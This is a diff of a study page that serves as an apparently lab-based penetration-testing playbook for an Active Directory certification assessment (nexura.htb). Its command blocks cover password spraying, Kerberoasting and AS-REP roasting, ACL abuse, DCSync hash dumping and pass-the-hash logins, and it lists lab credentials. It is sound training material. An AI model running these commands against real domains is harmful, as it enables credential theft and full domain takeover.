@@ -1,6 +1,6 @@
 ---
 title: "AD Enumeration & Attacks: Skills Assessment Hub"
-sidebarTitle: "AD skills assessment"
+sidebarTitle: "AD Skills Assessment Hub"
 description: "Active Directory Module #13 Skills Assessment Part 1 (nexura.htb worked walkthrough) and Part 2 operational execution playbook."
 keywords: ["ad skills assessment", "nexura.htb", "active directory assessment", "part 1", "part 2", "dcsync", "bloodhound"]
 boost: 2
@@ -16,93 +16,126 @@ import { TargetContextBar } from "/snippets/target-context-bar.jsx";
 
 {/* Generated from Active Directory/AD Skills Assessment.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-The **HTB CPTS Module #13 (Active Directory Enumeration & Attacks)** concludes with a two-part multi-host Skills Assessment. This hub connects your completed **Part 1 (`nexura.htb`)** full walkthrough directly into the Active Directory study path and provides a structured operational playbook and evidence checklist for **Part 2**.
+**HTB CPTS Module #13 (Active Directory Enumeration & Attacks)** concludes with a **two-part multi-host Skills Assessment** (**Part 1** and **Part 2**). Use the decision matrix and phase-by-phase runbook below during both assessments.
+
+<Note>
+**Assessment Attribution Note (`nexura.htb`)**
+
+Your completed **`nexura.htb`** full kill-chain walkthrough in **[AD Attack Path — Worked Example (`nexura.htb`)](/cheatsheets/ad-attack-path-worked-example)** is the **Module #10 (Password Attacks) Skills Assessment**, not Module #13 Part 1. Keep it open alongside this playbook as a proven template for DMZ foothold → Ligolo/Chisel pivot → share looting → `JUMP01` `SeImpersonate` → LSASS dump → `DC01` DCSync.
+</Note>
 
 ---
 
-## Part 1: Worked End-to-End AD Attack Path (`nexura.htb`)
+## Fast Triage Decision Matrix (Both Parts)
 
-<Tip>
-**Complete Part 1 Walkthrough Captured**
-
-Your full end-to-end solution, command transcript, and troubleshooting lessons for **AD Skills Assessment Part 1 (`nexura.htb`)** are documented in **[AD Attack Path — Worked Example (`nexura.htb`)](/cheatsheets/ad-attack-path-worked-example)**.
-</Tip>
-
-### Part 1 Kill-Chain Summary (`nexura.htb`)
-
-| Stage | Vantage Point / Identity | Technique & Tooling | Outcome / Next Pivot |
-| --- | --- | --- | --- |
-| **1. OSINT & User List** | External Kali | Employee name harvesting + `namebuster` / `username-anarchy` | Generated valid corporate username candidates |
-| **2. DMZ Foothold** | External → `DMZ01` (`SSH`) | Password spray (`Texas123!@#`) via `hydra` | Authenticated SSH shell as `jbetty` on dual-homed Linux DMZ host |
-| **3. Local Credential Loot** | `DMZ01` (`jbetty`) | Local file & history enumeration | Recovered domain credentials for `hwilliam` (`dealer-screwed-gym1`) |
-| **4. Internal Pivot** | `Kali ↔ DMZ01 → 172.16.119.0/24` | [Ligolo-ng](/pivoting/ligolo) TUN route / [Chisel](/pivoting/chisel) reverse SOCKS5 | Routed access to internal AD subnet `172.16.119.0/24` (`DC01`, `MS01`, `WS01`) |
-| **5. Lateral Movement** | `hwilliam` → `bdavid` | Internal SMB/local admin check (`nxc smb`) + credential hunting | Compromised `bdavid` with read access to `HR` share |
-| **6. Share Looting & Cracking** | `bdavid` on `\\172.16.119.10\HR` | `nxc smb --get-file 'Archive\Employee-Passwords_OLD.psafe3'` + `pwsafe2john` + `john` | Cracked PasswordSafe vault → recovered `stom` credentials (`calves-warp-learning1`) |
-| **7. ACL / DCSync Compromise** | `stom` → `DC01` (`172.16.119.11`) | BloodHound / `bloodyAD` ACL check → `impacket-secretsdump` DCSync | Extracted `Administrator` NT hash and achieved full Domain Admin on `DC01` |
-
-- **[Open the full Part 1 Worked Walkthrough →](/cheatsheets/ad-attack-path-worked-example)**
+| Current Position / Lead | Immediate Action | Exact Command / Playbook |
+| --- | --- | --- |
+| **External IP / Web / SMB only (no AD creds)** | OSINT names → `username-anarchy` → Kerbrute userenum → check null SMB/RPC & AS-REP | [03 External Recon](/active-directory/external-recon) · [06 User Lists](/active-directory/password-policy-user-lists) |
+| **Candidate username + 1 discovered password** | Check `--pass-pol` lockout threshold first, then spray 1 password across users | `nxc smb DC_IP -u users.txt -p 'PASSWORD' --continue-on-success` |
+| **DMZ Linux or Web foothold** | Loot configs/history/env/keys, check dual-NIC (`ip a`), start Ligolo-ng tunnel to internal AD | [Ligolo-ng](/pivoting/ligolo) (`240.0.0.1/32` for local ports + internal CIDR) |
+| **First valid domain user** | Run BloodHound CE collection + spider non-default SMB shares + Kerberoast/AS-REP | [AD Enumeration](/active-directory/enumeration) |
+| **Outbound ACL edge in BloodHound** | Check `bloodyAD get writable`; abuse `ForceChangePassword`, `AddMember`, `GenericWrite` (Shadow Creds / SPN), `WriteDACL`, `ReadGMSAPassword` | [ACL Abuse](/active-directory/acl-abuse) |
+| **Local Admin on member host (`Pwn3d!`)** | Check active sessions (`qwinsta`), elevate (`SeImpersonate` / UAC), dump SAM + LSA + LSASS | [Windows Post-Exploitation](/cheatsheets/windows-post-exploitation) |
+| **Unconstrained / Constrained / RBCD Delegation** | S4U2Self + S4U2Proxy (`impacket-getST -impersonate Administrator`) or coerce to unconstrained host | [Kerberos Delegation](/active-directory/delegation) |
+| **Domain Admin / Replication rights** | DCSync `Administrator` & `krbtgt` from `DC01`, then authenticate via `evil-winrm` / `psexec` | [DCSync & Dumping](/active-directory/dcsync-credential-dumping) |
 
 ---
 
-## Part 2: AD Skills Assessment Part 2 Playbook & Checklist
+## Part 1 Playbook: Perimeter Foothold → Internal AD Escalation → Domain Admin
 
-When executing **AD Skills Assessment Part 2** (which starts from an initial foothold or web/RDP entry point and chains internal AD enumeration, privilege escalation, ACL/delegation/certificate or trust abuse to compromise the target domain), follow this structured execution sequence:
+### Step 1: Unauthenticated Recon, User List & Initial Domain Credential
 
-### Step 1: Entry Host Foothold & Local Enumeration
+```bash
+# Map open ports, domain FQDN, and DC hostname
+nmap -sC -sV -p 53,80,88,135,139,389,443,445,636,3268,3389,5985 TARGET_IP -oA nmap/ad-part1
+
+# Null / guest checks & RID cycling if permitted
+nxc smb TARGET_IP -u '' -p '' --shares
+nxc smb TARGET_IP -u 'guest' -p '' --rid-brute
+kerbrute userenum -d DOMAIN_FQDN --dc DC_IP usernames.txt
+impacket-GetNPUsers DOMAIN_FQDN/ -dc-ip DC_IP -usersfile usernames.txt -no-pass -format hashcat -outputfile asrep.hash
+```
+
+### Step 2: Authenticated Domain Enumeration & BloodHound Collection
+
+```bash
+# Check password policy BEFORE any password spraying
+nxc smb DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' --pass-pol --users --groups --shares
+
+# Spider readable SMB shares for scripts, KeePass/PasswordSafe vaults, XMLs, and backups
+nxc smb INTERNAL_CIDR -d DOMAIN_FQDN -u USER -p 'PASSWORD' -M spider_plus
+
+# Collect BloodHound CE graph (add --dns-tcp when running over a tunnel)
+bloodhound-ce-python -d DOMAIN_FQDN -u USER -p 'PASSWORD' -ns DC_IP -c All --zip --dns-tcp
+```
+
+### Step 3: Roasting, Outbound ACL Chain & Lateral Movement
+
+```bash
+# Kerberoast SPN accounts & check encryption type ($krb5tgs$23$ -> -m 13100, $18$ -> -m 19700)
+impacket-GetUserSPNs 'DOMAIN_FQDN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile part1-kerb.hash
+
+# Fast CLI check for writable AD objects from your current user
+bloodyAD --host DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' get writable
+```
+
+---
+
+## Part 2 Playbook: Foothold Host → Multi-Hop Pivot & AD Privilege Escalation
+
+### Step 1: Entry Host Situational Awareness & Credential Harvesting
 
 ```powershell
-# Confirm current identity, token privileges, and network interfaces
+# Windows entry foothold: check privileges, groups, interfaces, listeners, and logged-on users
 whoami /all
 ipconfig /all
 route print
 netstat -ano
+qwinsta
+cmdkey /list
 ```
 
-- Sweep for local credentials, PowerShell transcripts/history, scheduled tasks, web root configs (`C:\inetpub\wwwroot\`), and saved credentials (`cmdkey /list`).
-- If landing on a Linux or DMZ host first, establish a [Ligolo-ng](/pivoting/ligolo) tunnel into the internal AD subnet and point `/etc/hosts` at the internal Domain Controller.
+- Sweep web roots (`C:\inetpub\wwwroot\`, `/var/www/`), PowerShell `ConsoleHost_history.txt`, scheduled tasks, service accounts, and registry autologon keys.
+- Establish a [Ligolo-ng](/pivoting/ligolo) tunnel into the internal AD subnet and add the internal DC + server FQDNs to `/etc/hosts`.
 
-### Step 2: Domain Discovery & BloodHound Collection
-
-```bash
-# From Kali through the tunnel:
-nxc smb INTERNAL_CIDR -d DOMAIN_FQDN -u USER -p 'PASSWORD'
-nxc smb DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' --users --groups --pass-pol
-bloodhound-ce-python -d DOMAIN_FQDN -u USER -p 'PASSWORD' -ns DC_IP -c All --zip --dns-tcp
-```
+### Step 2: Internal AD Collection & Privilege Escalation Triage
 
 ```powershell
-# Or from a domain-joined Windows shell:
+# From a domain-joined Windows shell when Kali cannot reach every host directly:
 .\SharpHound.exe -c All --zipfilename ad-part2.zip
 ```
 
-### Step 3: Systematic AD Escalation Triage
-
-Check each of these five core AD attack primitives against your current identity and groups:
-
-1. **Readable Shares & SYSVOL Scripts:**
-   - `nxc smb INTERNAL_CIDR -d DOMAIN_FQDN -u USER -p 'PASSWORD' -M spider_plus`
-2. **Kerberoasting & AS-REP Roasting:**
-   - `impacket-GetUserSPNs 'DOMAIN_FQDN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile part2-kerb.hash`
-   - `impacket-GetNPUsers 'DOMAIN_FQDN/USER:PASSWORD' -dc-ip DC_IP -request -format hashcat -outputfile part2-asrep.hash`
-3. **Outbound Object Control (ACL Abuse Chain):**
-   - In BloodHound, check **Transitive Object Control** from your owned principals, or run:
+1. **Mark every compromised principal as Owned** in BloodHound CE and run:
+   - `MATCH p=shortestPath((u:Tag_Owned)-[*1..]->(t:Tag_Tier_Zero)) RETURN p`
+2. **Check ACLs, Delegation, GPOs & Trusts:**
+   - Outbound `GenericAll` / `GenericWrite` / `WriteDACL` / `ForceChangePassword` / `AddMember` / `ReadGMSAPassword` / `ReadLAPSPassword` ([ACL Abuse](/active-directory/acl-abuse)).
+   - Constrained (`AllowedToDelegate`) or Resource-Based Constrained Delegation (`AllowedToAct` / machine account quota `ms-DS-MachineAccountQuota`) ([Kerberos Delegation](/active-directory/delegation)).
+   - Admin sessions (`HasSession` / `AdminTo`) on jump hosts or member servers where LSASS / DPAPI / token impersonation yields a Tier-0 account.
+3. **Final Domain Compromise Proof:**
 
 ```bash
-bloodyAD --host DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' get writable
+impacket-secretsdump 'DOMAIN_FQDN/USER:PASSWORD@DC_IP' -just-dc-user Administrator
+evil-winrm -i DC_IP -u Administrator -H NT_HASH
 ```
 
-   - Follow the exact ACL primitive in [ACL Abuse Quick Reference](/active-directory/acl-abuse) (`ForceChangePassword`, `AddMember`, `GenericWrite` SPN/Shadow Credentials, `WriteDACL`, `ReadGMSAPassword`).
-4. **Kerberos Delegation & Coercion:**
-   - Check for computers/users with **Unconstrained Delegation** (`trustedforauth`) or **Constrained / RBCD Delegation** ([Kerberos Delegation Quick Reference](/active-directory/delegation)).
-5. **DomainController / Admin Session Compromise:**
-   - Once an account with local admin on a member server or DC is compromised, dump LSASS / SAM / NTDS (`impacket-secretsdump`) and authenticate to the DC via `evil-winrm` or `impacket-psexec` to retrieve the final assessment flags.
+---
+
+## Reference: Completed Multi-Host Kill Chain (`nexura.htb` — Module #10 Password Attacks Assessment)
+
+| Stage | Vantage Point / Identity | Technique & Tooling | Actual Outcome |
+| --- | --- | --- | --- |
+| **1. OSINT & Usernames** | External Kali | Staff name (`Betty Jayde`) + `namebuster` | Permuted corporate username candidate list |
+| **2. DMZ SSH Foothold** | External → `DMZ01` | Hydra SSH password spray (`Texas123!@#`) | Shell as `jbetty` on dual-homed Linux DMZ host |
+| **3. Pivot & Linux Loot** | `DMZ01` → `172.16.119.0/24` | Ligolo-ng / Chisel pivot + `.bash_history` | Recovered domain creds `hwilliam : dealer-screwed-gym1` |
+| **4. Share Vault Cracking** | `FILE01` SMB share | Looted `Employee-Passwords_OLD.psafe3` → `pwsafe2john` + `john` | Recovered `bdavid` password (`caramel-cigars-reply1`) & historical `stom` entry |
+| **5. BloodHound Mapping** | `bdavid` (`nexura.htb`) | `bloodhound-ce-python` | Identified `bdavid AdminTo JUMP01` and `stom MemberOf Domain Admins` |
+| **6. Jump Host SYSTEM & LSASS** | `JUMP01` (`bdavid` RDP) | `xfreerdp3` → `SeImpersonate` (`PrintSpoofer`/`GodPotato`) → `Mimikatz` | Dumped active `stom` session password (`calves-warp-learning1`) from LSASS |
+| **7. Domain Compromise** | `stom` → `DC01` (`172.16.119.11`) | `impacket-secretsdump` DCSync | Extracted `Administrator` & `krbtgt` NT hashes |
+
+- **[Open the full `nexura.htb` Worked Example →](/cheatsheets/ad-attack-path-worked-example)**
 
 ---
 
 ## Related Active Directory References
 
-- [Active Directory Study Index (Lessons 01–28)](/active-directory/index)
-- [AD Enumeration Command Reference](/active-directory/command-reference)
-- [AD Enumeration Methodology](/active-directory/methodology)
-- [AD Troubleshooting & Kerberos Fixes](/active-directory/troubleshooting)
-- [BloodHound Complete Guide](/cheatsheets/bloodhound-complete-guide)
+- [Active Directory Study Index (Lessons 01–28)](/active-directory/index) · [AD Command Reference](/active-directory/command-reference) · [AD Methodology](/active-directory/methodology) · [AD Troubleshooting](/active-directory/troubleshooting) · [BloodHound Complete Guide](/cheatsheets/bloodhound-complete-guide)
